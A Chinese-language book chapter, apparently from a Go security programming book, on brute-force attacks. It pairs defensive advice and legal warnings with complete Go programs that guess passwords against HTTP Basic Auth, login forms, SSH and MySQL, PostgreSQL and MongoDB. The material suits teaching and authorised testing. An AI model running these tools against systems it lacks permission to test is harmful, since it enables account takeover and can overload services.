# 第八章：暴力破解

暴力破解攻击，也称为穷举密钥攻击，是指您尝试对输入的每种可能组合，直到最终获得正确的组合。最常见的例子是暴力破解密码。您可以尝试每种字符、字母和符号的组合，或者您可以使用字典列表作为密码的基础。您可以在线找到基于常见密码的字典和预构建的单词列表，或者您可以创建自己的列表。

有不同类型的暴力破解密码攻击。有在线攻击，例如反复尝试登录网站或数据库。由于网络延迟和带宽限制，在线攻击速度较慢。服务也可能在太多失败尝试后对帐户进行速率限制或锁定。另一方面，还有离线攻击。离线攻击的一个例子是当您在本地硬盘上有一个充满哈希密码的数据库转储，并且您可以无限制地进行暴力破解，除了物理硬件。严肃的密码破解者会构建配备了几张强大图形卡的计算机，用于破解，这样的计算机成本高达数万美元。

关于在线暴力破解攻击的一点需要注意的是，它们很容易被检测到，会产生大量流量，可能会给服务器带来沉重负载，甚至完全使其崩溃，并且未经许可是非法的。在线服务方面的许可可能会让人产生误解。例如，仅因为您在 Facebook 等服务上拥有帐户，并不意味着您有权对自己的帐户进行暴力破解攻击。Facebook 仍然拥有服务器，即使只针对您的帐户，您也没有权限攻击他们的网站。即使您在 Amazon 服务器上运行自己的服务，例如 SSH 服务，您仍然没有权限进行暴力破解攻击。您必须请求并获得对 Amazon 资源进行渗透测试的特殊许可。您可以使用自己的虚拟机进行本地测试。

网络漫画*xkcd*有一部漫画与暴力破解密码的主题完美相关：

![](img/17987bbd-217b-435f-b4eb-bb536d16c4de.png)

来源：https://xkcd.com/936/

大多数，如果不是所有这些攻击，都可以使用以下一种或多种技术进行保护：

+   强密码（最好是口令或密钥）

+   实施失败尝试的速率限制/临时锁定

+   使用 CAPTCHA

+   添加双因素认证

+   加盐密码

+   限制对服务器的访问

本章将涵盖几个暴力破解的例子，包括以下内容：

+   HTTP 基本认证

+   HTML 登录表单

+   SSH 密码认证

+   数据库

# 暴力破解 HTTP 基本认证

HTTP 基本认证是指您在 HTTP 请求中提供用户名和密码。您可以在现代浏览器中将其作为 URL 的一部分传递。考虑以下示例：

```go
http://username:password@www.example.com
```

在编程时添加基本认证时，凭据以名为`Authorization`的 HTTP 标头提供，其中包含以 base64 编码并以`Basic`为前缀，用空格分隔的`username:password`值。考虑以下示例：

```go
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

Web 服务器在认证失败时通常会响应`401 Access Denied`代码，并且应该以`200 OK`等`2xx`成功代码进行响应。

此示例将获取一个 URL 和一个`username`值，并尝试使用生成的密码进行登录。

为了减少此类攻击的效果，可以在一定数量的登录尝试失败后实施速率限制功能或帐户锁定功能。

如果您需要从头开始构建自己的密码列表，请尝试从维基百科中记录的最常见密码开始[`en.wikipedia.org/wiki/List_of_the_most_common_passwords`](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)。以下是一个可以保存为`passwords.txt`的简短示例：

```go
password
123456
qwerty
abc123
iloveyou
admin
passw0rd
```

将前面代码块中的列表保存为一个文本文件，每行一个密码。名称不重要，因为你会将密码列表文件名作为命令行参数提供：

```go
package main 

import ( 
   "bufio" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Basic Auth 

Passwords should be separated by newlines. 
URL should include protocol prefix. 

Usage: 
  ` + os.Args[0] + ` <username> <pwlistfile> <url> 

Example: 
  ` + os.Args[0] + ` admin passwords.txt https://www.test.com 
`) 
} 

func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 

func testBasicAuth(url, username, password string, doneChannel chan bool) { 
   client := &http.Client{} 
   request, err := http.NewRequest("GET", url, nil) 
   request.SetBasicAuth(username, password) 

   response, err := client.Do(request) 
   if err != nil { 
      log.Fatal(err) 
   } 
   if response.StatusCode == 200 { 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   
         password) 
      os.Exit(0) 
    } 
    doneChannel <- true 
} 

func main() { 
   username, pwListFilename, url := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testBasicAuth(url, username, password, doneChannel) 

      // If max threads reached, wait for one to finish before continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解 HTML 登录表单

几乎每个具有用户系统的网站都在网页上提供登录表单。我们可以编写一个程序来重复提交登录表单。这个例子假设在 Web 应用程序上没有 CAPTCHA、速率限制或其他阻止机制。请记住不要对任何生产站点或您不拥有或没有权限的站点执行此攻击。如果您想测试它，我建议您设置一个本地 Web 服务器并仅在本地测试。

每个网络表单都可以使用不同的名称创建`用户名`和`密码`字段，因此这些字段的名称需要在每次运行时提供，并且必须特定于目标 URL。

查看源代码或检查目标表单，以获取输入元素的`name`属性以及`form`元素的目标`action`属性。如果`form`元素中没有提供操作 URL，则默认为当前 URL。另一个重要的信息是表单上使用的方法。登录表单应该是`POST`，但有可能编码不好，使用了`GET`方法。有些登录表单使用 JavaScript 提交表单，可能完全绕过标准的表单方法。使用这种逻辑的站点需要更多的逆向工程来确定最终的提交目的地和数据格式。您可以使用 HTML 代理或在浏览器中使用网络检查器查看 XHR 请求。

后面的章节将讨论 Web 爬取和在`DOM`接口中查询特定元素的方法，但本章不会讨论尝试自动检测表单字段并识别正确的输入元素。这一步必须在这里手动完成，但一旦识别出来，暴力攻击就可以自行运行。

为了防止这样的攻击，实施一个 CAPTCHA 系统或速率限制功能。

请注意，每个 Web 应用程序都可以有自己的身份验证方式。这不是一刀切的解决方案。它提供了一个基本的`HTTP POST`表单登录示例，但需要针对不同的应用程序进行轻微修改。

```go
package main 

import ( 
   "bufio" 
   "bytes" 
   "fmt" 
   "log" 
   "net/http" 
   "os" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force HTTP Login Form 

Passwords should be separated by newlines. 
URL should include protocol prefix. 
You must identify the form's post URL and username and password   
field names and pass them as arguments. 

Usage: 
  ` + os.Args[0] + ` <pwlistfile> <login_post_url> ` + 
      `<username> <username_field> <password_field> 

Example: 
  ` + os.Args[0] + ` passwords.txt` +
      ` https://test.com/login admin username password 
`) 
} 

func checkArgs() (string, string, string, string, string) { 
   if len(os.Args) != 6 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Password list, Post URL, username, username field, 
   // password field 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 

func testLoginForm( 
   url, 
   userField, 
   passField, 
   username, 
   password string, 
   doneChannel chan bool, 
) 
{ 
   postData := userField + "=" + username + "&" + passField + 
      "=" + password 
   request, err := http.NewRequest( 
      "POST", 
      url, 
      bytes.NewBufferString(postData), 
   ) 
   client := &http.Client{} 
   response, err := client.Do(request) 
   if err != nil { 
      log.Println("Error making request. ", err) 
   } 
   defer response.Body.Close() 

   body := make([]byte, 5000) // ~5k buffer for page contents 
   response.Body.Read(body) 
   if bytes.Contains(body, []byte("ERROR")) { 
      log.Println("Error found on website.") 
   } 
   log.Printf("%s", body) 

   if bytes.Contains(body,[]byte("ERROR")) || response.StatusCode != 200 { 
      // Error on page or in response code 
   } else { 
      log.Println("Possible success with password: ", password) 
      // os.Exit(0) // Exit on success? 
   } 

   doneChannel <- true 
} 

func main() { 
   pwList, postUrl, username, userField, passField := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwList) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 32 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testLoginForm( 
         postUrl, 
         userField, 
         passField, 
         username, 
         password, 
         doneChannel, 
      ) 

      // If max threads reached, wait for one to finish before  
      //continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解 SSH

安全外壳或 SSH 支持几种身份验证机制。如果服务器只支持公钥身份验证，那么暴力破解几乎是徒劳的。这个例子只会讨论 SSH 的密码身份验证。

为了防止这样的攻击，实施速率限制或使用类似 fail2ban 的工具，在检测到一定数量的登录失败尝试时，锁定帐户一段时间。还要禁用 root 远程登录。有些人喜欢将 SSH 放在非标准端口上，但最终放在高端口号的非受限端口上，比如`2222`，这不是一个好主意。如果您使用高端口号的非特权端口，另一个低特权用户可能会劫持该端口，并在其位置上启动自己的服务。如果要更改端口，将 SSH 守护程序放在低于`1024`的端口上。

这种攻击显然在日志中很吵闹，容易被检测到，并且被 fail2ban 等工具阻止。但如果您正在进行渗透测试，检查速率限制或帐户锁定是否存在可以作为一种快速方法。如果没有配置速率限制或临时帐户锁定，暴力破解和 DDoS 是潜在的风险。

运行此程序需要从[golang.org](http://www.golang.org)获取一个 SSH 包。您可以使用以下命令获取它：

```go
go get golang.org/x/crypto/ssh
```

安装所需的`ssh`包后，可以运行以下示例：

```go
package main 

import ( 
   "bufio" 
   "fmt" 
   "log" 
   "os" 

   "golang.org/x/crypto/ssh" 
) 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force SSH Password 

Passwords should be separated by newlines. 
URL should include hostname or ip with port number separated by colon 

Usage: 
  ` + os.Args[0] + ` <username> <pwlistfile> <url:port> 

Example: 
  ` + os.Args[0] + ` root passwords.txt example.com:22 
`) 
} 

func checkArgs() (string, string, string) { 
   if len(os.Args) != 4 { 
      log.Println("Incorrect number of arguments.") 
      printUsage() 
      os.Exit(1) 
   } 

   // Username, Password list filename, URL 
   return os.Args[1], os.Args[2], os.Args[3] 
} 

func testSSHAuth(url, username, password string, doneChannel chan bool) { 
   sshConfig := &ssh.ClientConfig{ 
      User: username, 
      Auth: []ssh.AuthMethod{ 
         ssh.Password(password), 
      }, 
      // Do not check server key 
      HostKeyCallback: ssh.InsecureIgnoreHostKey(), 

      // Or, set the expected ssh.PublicKey from remote host 
      //HostKeyCallback: ssh.FixedHostKey(pubkey), 
   } 

   _, err := ssh.Dial("tcp", url, sshConfig) 
   if err != nil { 
      // Print out the error so we can see if it is just a failed   
      // auth or if it is a connection/name resolution problem. 
      log.Println(err) 
   } else { // Success 
      log.Printf("Success!\nUser: %s\nPassword: %s\n", username,   
      password) 
      os.Exit(0) 
   } 

   doneChannel <- true // Signal another thread spot has opened up 
} 

func main() { 

   username, pwListFilename, url := checkArgs() 

   // Open password list file 
   passwordFile, err := os.Open(pwListFilename) 
   if err != nil { 
      log.Fatal("Error opening file. ", err) 
   } 
   defer passwordFile.Close() 

   // Default split method is on newline (bufio.ScanLines) 
   scanner := bufio.NewScanner(passwordFile) 

   doneChannel := make(chan bool) 
   numThreads := 0 
   maxThreads := 2 

   // Check each password against url 
   for scanner.Scan() { 
      numThreads += 1 

      password := scanner.Text() 
      go testSSHAuth(url, username, password, doneChannel) 

      // If max threads reached, wait for one to finish before continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解数据库登录

数据库登录可以像其他方法一样自动化和暴力破解。在以前的暴力破解示例中，大部分代码都是相同的。这些应用程序之间的主要区别在于实际测试身份验证的函数。而不是再次重复所有的代码，这些片段将简单地演示如何登录到各种数据库。修改以前的暴力破解脚本，以测试其中一个而不是 SSH 或 HTTP 方法。

为了防止这种情况发生，限制对数据库的访问只允许需要它的机器，并禁用根远程登录。

Go 标准库中没有提供任何数据库驱动程序，只有接口。因此，所有这些数据库示例都需要来自 GitHub 的第三方包，以及一个正在运行的数据库实例进行连接。本书不涵盖如何安装和配置这些数据库服务。可以使用`go get`命令安装这些包中的每一个：

+   MySQL: [`github.com/go-sql-driver/mysql`](https://github.com/go-sql-driver/mysql)

+   MongoDB: [`github.com/go-mgo/mgo`](https://github.com/go-mgo/mgo)

+   PostgreSQL: [`github.com/lib/pq`](https://github.com/lib/pq)

这个例子结合了所有三个数据库库，并提供了一个工具，可以暴力破解 MySQL、MongoDB 或 PostgreSQL。数据库类型被指定为命令行参数之一，以及用户名、主机、密码文件和数据库名称。MongoDB 和 MySQL 不需要像 PostgreSQL 那样的数据库名称，所以在不使用`postgres`选项时是可选的。创建了一个名为`loginFunc`的特殊变量，用于存储与指定数据库类型关联的登录函数。这是我们第一次使用变量来保存一个函数。然后使用登录函数执行暴力破解攻击：

```go
package main 

import ( 
   "database/sql" 
   "log" 
   "time" 

   // Underscore means only import for 
   // the initialization effects. 
   // Without it, Go will throw an 
   // unused import error since the mysql+postgres 
   // import only registers a database driver 
   // and we use the generic sql.Open() 
   "bufio" 
   "fmt" 
   _ "github.com/go-sql-driver/mysql" 
   _ "github.com/lib/pq" 
   "gopkg.in/mgo.v2" 
   "os" 
) 

// Define these at the package level since they don't change, 
// so we don't have to pass them around between functions 
var ( 
   username string 
   // Note that some databases like MySQL and Mongo 
   // let you connect without specifying a database name 
   // and the value will be omitted when possible 
   dbName        string 
   host          string 
   dbType        string 
   passwordFile  string 
   loginFunc     func(string) 
   doneChannel   chan bool 
   activeThreads = 0 
   maxThreads    = 10 
) 

func loginPostgres(password string) { 
   // Create the database connection string 
   // postgres://username:password@host/database 
   connStr := "postgres://" 
   connStr += username + ":" + password 
   connStr += "@" + host + "/" + dbName 

   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("postgres", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 

   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with Postgres. ", err) 
   } 
   doneChannel <- true 
} 

func loginMysql(password string) { 
   // Create database connection string 
   // user:password@tcp(host)/database?charset=utf8 
   // The database name is not required for a MySQL 
   // connection so we leave it off here. 
   // A user may have access to multiple databases or 
   // maybe we do not know any database names 
   connStr := username + ":" + password 
   connStr += "@tcp(" + host + ")/" // + dbName 
   connStr += "?charset=utf8" 

   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("mysql", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 

   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with MySQL. ", err) 
   } 
   doneChannel <- true 
} 

func loginMongo(password string) { 
   // Define Mongo connection info 
   // mgo does not use the Go sql driver like the others 
   mongoDBDialInfo := &mgo.DialInfo{ 
      Addrs:   []string{host}, 
      Timeout: 10 * time.Second, 
      // Mongo does not require a database name 
      // so it is omitted to improve auth chances 
      //Database: dbName, 
      Username: username, 
      Password: password, 
   } 
   _, err := mgo.DialWithInfo(mongoDBDialInfo) 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      log.Println("Error connecting to Mongo. ", err) 
   } 
   doneChannel <- true 
} 

func exitWithSuccess(password string) { 
   log.Println("Success!") 
   log.Printf("\nUser: %s\nPass: %s\n", username, password) 
   os.Exit(0) 
} 

func bruteForce() { 
   // Load password file 
   passwords, err := os.Open(passwordFile) 
   if err != nil { 
      log.Fatal("Error opening password file. ", err) 
   } 

   // Go through each password, line-by-line 
   scanner := bufio.NewScanner(passwords) 
   for scanner.Scan() { 
      password := scanner.Text() 

      // Limit max goroutines 
      if activeThreads >= maxThreads { 
         <-doneChannel // Wait 
         activeThreads -= 1 
      } 

      // Test the login using the specified login function 
      go loginFunc(password) 
      activeThreads++ 
   } 

   // Wait for all threads before returning 
   for activeThreads > 0 { 
      <-doneChannel 
      activeThreads -= 1 
   } 
} 

func checkArgs() (string, string, string, string, string) { 
   // Since the database name is not required for Mongo or Mysql 
   // Just set the dbName arg to anything. 
   if len(os.Args) == 5 && 
      (os.Args[1] == "mysql" || os.Args[1] == "mongo") { 
      return os.Args[1], os.Args[2], os.Args[3], os.Args[4],   
      "IGNORED" 
   } 
   // Otherwise, expect all arguments. 
   if len(os.Args) != 6 { 
      printUsage() 
      os.Exit(1) 
   } 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force database login  

Attempts to brute force a database login for a specific user with  
a password list. Database name is ignored for MySQL and Mongo, 
any value can be provided, or it can be omitted. Password file 
should contain passwords separated by a newline. 

Database types supported: mongo, mysql, postgres 

Usage: 
  ` + os.Args[0] + ` (mysql|postgres|mongo) <pwFile>` +
     ` <user> <host>[:port] <dbName> 

Examples: 
  ` + os.Args[0] + ` postgres passwords.txt nanodano` +
      ` localhost:5432  myDb   
  ` + os.Args[0] + ` mongo passwords.txt nanodano localhost 
  ` + os.Args[0] + ` mysql passwords.txt nanodano localhost`) 
} 

func main() { 
   dbType, passwordFile, username, host, dbName = checkArgs() 

   switch dbType { 
   case "mongo": 
       loginFunc = loginMongo 
   case "postgres": 
       loginFunc = loginPostgres 
   case "mysql": 
       loginFunc = loginMysql 
   default: 
       fmt.Println("Unknown database type: " + dbType) 
       fmt.Println("Expected: mongo, postgres, or mysql") 
       os.Exit(1) 
   } 

   doneChannel = make(chan bool) 
   bruteForce() 
} 
```

# 摘要

阅读完本章后，您现在将了解基本的暴力破解攻击如何针对不同的应用程序工作。您应该能够根据自己的需求调整这里给出的示例来攻击不同的协议。

请记住，这些例子可能是危险的，可能会导致拒绝服务，并且不建议您对生产服务运行它们，除非是为了测试您的暴力破解防护措施。只对您控制的服务执行这些测试，获得测试权限并了解后果。您不应该对您不拥有的服务使用这些例子或这些类型的攻击，否则您可能会触犯法律并陷入严重的法律问题。

对于测试来说，有一些细微的法律界限可能很难区分。例如，如果您租用硬件设备，您在技术上并不拥有它，并且需要获得许可才能对其进行测试，即使它位于您的数据中心。同样，如果您从亚马逊等提供商那里租用托管服务，您必须在执行渗透测试之前获得他们的许可，否则您可能会因违反服务条款而遭受后果。

在下一章中，我们将研究使用 Go 的 Web 应用程序以及如何通过使用最佳实践来增强它们的安全性，如 HTTPS、使用安全的 cookie 和安全的 HTTP 头部、转义 HTML 输出和添加日志。它还探讨了如何作为客户端消耗 Web 应用程序，通过发出请求、使用客户端 SSL 证书和使用代理。
